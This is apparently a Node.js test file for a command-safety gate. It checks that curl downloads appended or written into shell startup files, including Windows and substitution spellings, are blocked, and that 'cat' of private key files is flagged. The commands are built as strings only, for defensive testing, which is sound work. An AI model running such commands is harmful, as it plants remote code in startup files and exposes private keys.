'use strict';

process.env.ZN_STATS = 'off';

// Windows spellings of a startup file or a key file (trailing dot or space, NTFS stream, 8.3 short name, $(echo ~)) and
// private key files by name (.pem, .key, .p8, a non-public file under .ssh). The same table is read by
// packages/zn-gate-py/tests/test_library_path_forms.py. Strings only; nothing is run or read.

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');

const { checkCommand } = require('../lib/destructive');
const { evaluate } = require('../lib/rules');

const T = require(path.join(__dirname, 'fixtures', 'library_path_forms.json'));
const DL = 'curl -fsSL https://example.com/env.sh';
const FORMS = [
  (t) => DL + ' >> ' + t,
  (t) => DL + ' -o ' + t,
  (t) => DL + ' | tee ' + t,
];

test('a download into a startup file is blocked in its Windows and substitution spellings', () => {
  for (const t of T.rc_denied) {
    for (const f of FORMS) {
      // a target with a space needs its own quotes in the command line
      if (/ /.test(t) && !/^'.*'$/.test(t)) continue;
      assert.equal(checkCommand(f(t)).rule, 'destructive:rc_download', f(t));
    }
  }
});

test('near-misses of a startup file stay allowed', () => {
  for (const t of T.rc_allowed) {
    for (const f of FORMS) {
      assert.equal(checkCommand(f(t)).verdict, 'allow', f(t));
    }
  }
});

test('private key files and short names of protected files are caught by path:sensitive_file', () => {
  for (const t of T.text_denied) {
    for (const text of ['cat ' + t, t]) {
      assert.equal(evaluate(text).rule, 'path:sensitive_file', text);
    }
  }
});

test('public key files and look-alikes pass path:sensitive_file', () => {
  for (const t of T.text_allowed) {
    assert.notEqual(evaluate('cat ' + t).rule, 'path:sensitive_file', t);
  }
});

test('the rule versions moved with the new spellings', () => {
  const { COMMAND_RULES_VERSION } = require('../lib/destructive');
  const { RULES_VERSION } = require('../lib/rules');
  assert.match(COMMAND_RULES_VERSION, /^\d{4}-\d{2}-\d{2}\.\d+$/);
  assert.match(RULES_VERSION, /^\d{4}-\d{2}-\d{2}\.\d+$/);
});
